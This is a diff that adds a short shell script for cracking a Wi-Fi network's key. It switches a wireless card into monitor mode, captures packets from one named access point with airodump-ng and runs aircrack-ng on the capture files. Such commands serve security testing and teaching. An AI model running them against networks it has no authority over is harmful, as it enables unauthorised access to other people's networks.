@@ -1,0 +1,7 @@
+sudo ifconfig wlan0 down
+sudo iwconfig wlan0 mode monitor
+iwconfig
+
+sudo airodump-ng -c 1 --bssid 00:0C:E6:9A:E3:C3 -w dump wlan0
+aircrack-ng -b 00:0C:E6:9A:E3:C3 dump-01.cap dump-02.cap
+
